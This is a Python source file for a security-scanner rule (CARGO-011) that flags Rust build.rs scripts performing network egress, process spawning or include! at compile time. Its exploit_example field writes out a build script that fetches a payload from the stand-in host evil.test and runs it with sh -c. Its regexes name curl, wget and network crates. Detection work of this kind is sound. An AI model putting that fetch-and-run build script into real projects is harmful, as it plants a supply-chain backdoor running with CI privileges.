"""CARGO-011. build.rs runs network or process calls at compile time."""
from __future__ import annotations

import re

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import CargoFile

RULE = Rule(
    id="CARGO-011",
    title="build.rs runs network or process calls at compile time",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-1", "CICD-SEC-3"),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-94", "CWE-829"),
    recommendation=(
        "Audit the ``build.rs`` egress / exec idioms this rule "
        "flags. A build script runs as native code during ``cargo "
        "build`` with the build's full privileges (CI runner write "
        "access, any mounted credentials), before any test or "
        "sandbox, so a network call can fetch and run an "
        "attacker-controlled payload and an ``include!`` of a "
        "non-constant path can pull arbitrary source into the "
        "compile. Remove network access from the build script (do "
        "any fetching ahead of time, into a checked-in, reviewed "
        "artifact), ``include!`` only constant, in-repo paths, and "
        "keep any process calls limited to constant, well-known "
        "build tools (``pkg-config`` / ``cc``). Where a build script "
        "isn't strictly needed, drop it."
    ),
    docs_note=(
        "Reads the sibling ``build.rs`` and flags compile-time "
        "egress / exec idioms: network access (``std::net``, "
        "``reqwest``, ``ureq``, ``isahc``, ``curl``, ``hyper``, "
        "``tokio::net``), process spawning (``std::process::"
        "Command`` / ``Command::new``), and ``include!`` / "
        "``include_str!`` / ``include_bytes!`` of a path.\n\n"
        "The Rust analog of an npm install script (NPM lifecycle), "
        "a Maven build-time plugin (MVN-015), or a Go ``tool`` "
        "directive (GOMOD-011): code that runs during the build, "
        "not at application runtime. A build script with no "
        "flagged idiom (or no ``build.rs`` at all) passes."
    ),
    known_fp=(
        "Many legitimate ``build.rs`` files shell out to "
        "``pkg-config`` / ``cc`` (via ``std::process::Command``) to "
        "locate or compile native libraries, and some ``include!`` "
        "a checked-in generated file. Those are normal; the rule "
        "surfaces the compile-time-execution surface so a reviewer "
        "can confirm the command / path / endpoint is constant and "
        "trusted. Suppress per crate with a rationale once "
        "verified. Network idioms in a build script are rarely "
        "legitimate and deserve the closest look.",
    ),
    incident_refs=(
        "Compile-time / build-step code execution is the class "
        "behind the xz-utils backdoor (the payload ran from the "
        "build step, not the shipped library). A Rust ``build.rs`` "
        "that fetches or execs at compile time is the same "
        "primitive expressed in the Cargo build.",
    ),
    exploit_example=(
        "// Vulnerable build.rs: fetch-and-run at compile time.\n"
        "use std::process::Command;\n"
        "fn main() {\n"
        "    // egress: pull a script from an attacker-controlled host\n"
        "    let body = ureq::get(\"https://evil.test/x.sh\")\n"
        "        .call().unwrap().into_string().unwrap();\n"
        "    Command::new(\"sh\").arg(\"-c\").arg(body).status().unwrap();\n"
        "}\n"
        "\n"
        "// Attack: every `cargo build` (dev machine + CI) runs the\n"
        "// build script, which fetches and executes the remote\n"
        "// payload with the runner's privileges, before any test.\n"
        "\n"
        "// Safe: no network / exec in build.rs; do any code\n"
        "// generation from constant, in-repo, reviewed inputs, or\n"
        "// drop the build script entirely."
    ),
)


# Compile-time idioms grouped by category. Each pattern is matched
# against the build.rs text after line comments are stripped.
_NETWORK_RE = re.compile(
    r"\b(?:std::net|reqwest|ureq|isahc|hyper|tokio::net|"
    r"TcpStream|UdpSocket)\b|"
    r"\bCommand::new\(\s*\"curl\"|\bCommand::new\(\s*\"wget\"",
)
_PROCESS_RE = re.compile(
    r"\bstd::process::Command\b|\bCommand::new\b|\bprocess::Command\b",
)
_INCLUDE_RE = re.compile(
    r"\binclude!\s*\(|\binclude_str!\s*\(|\binclude_bytes!\s*\(",
)
_CHAR_LITERAL_RE = re.compile(r"'(?:\\.|[^'\\])'")


def _strip_comments(text: str) -> str:
    """Drop ``/* ... */`` block and ``// ...`` line comments while
    skipping over Rust string / char literals.

    A naive ``//[^\\n]*`` strip is string-literal-unaware: the ``//`` in
    a URL literal (``"http://x"``) reads as a comment start and eats the
    rest of the physical line, hiding a following idiom. This scanner
    walks the text and only treats ``//`` / ``/*`` as a comment when it
    is not inside a string, raw string, or char literal.
    """
    out: list[str] = []
    i, n = 0, len(text)
    while i < n:
        c = text[i]
        # Raw string: r"...", r#"..."#, r##"..."##, ...
        if c == "r" and i + 1 < n and text[i + 1] in ('"', "#"):
            j = i + 1
            hashes = 0
            while j < n and text[j] == "#":
                hashes += 1
                j += 1
            if j < n and text[j] == '"':
                closing = '"' + "#" * hashes
                end = text.find(closing, j + 1)
                if end == -1:
                    out.append(text[i:])
                    break
                out.append(text[i:end + len(closing)])
                i = end + len(closing)
                continue
        if c == '"':
            j = i + 1
            while j < n:
                if text[j] == "\\":
                    j += 2
                    continue
                if text[j] == '"':
                    j += 1
                    break
                j += 1
            out.append(text[i:j])
            i = j
            continue
        if c == "'":
            m = _CHAR_LITERAL_RE.match(text, i)
            if m:
                out.append(m.group(0))
                i = m.end()
                continue
            # A lifetime (``'a``) has no closing quote; emit and advance.
            out.append(c)
            i += 1
            continue
        if c == "/" and i + 1 < n and text[i + 1] == "/":
            end = text.find("\n", i)
            if end == -1:
                break
            i = end
            continue
        if c == "/" and i + 1 < n and text[i + 1] == "*":
            end = text.find("*/", i + 2)
            if end == -1:
                break
            i = end + 2
            continue
        out.append(c)
        i += 1
    return "".join(out)


def check(manifest: CargoFile) -> Finding:
    if not manifest.build_rs_text:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=manifest.path,
            description="No build.rs alongside this Cargo.toml.",
            recommendation=RULE.recommendation, passed=True,
        )
    body = _strip_comments(manifest.build_rs_text)
    categories: list[str] = []
    if _NETWORK_RE.search(body):
        categories.append("network egress")
    if _INCLUDE_RE.search(body):
        categories.append("include! of a path")
    if _PROCESS_RE.search(body):
        categories.append("process exec")
    passed = not categories
    resource = manifest.build_rs_path or manifest.path
    desc = (
        "build.rs declares no compile-time egress / exec idioms."
        if passed else
        f"build.rs runs compile-time {', '.join(categories)}. A "
        f"build script executes during ``cargo build`` with the "
        f"runner's privileges; confirm every endpoint / command / "
        f"include path is constant and trusted."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=resource, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=[Location(path=resource, start_line=1, end_line=1)]
        if not passed else [],
    )
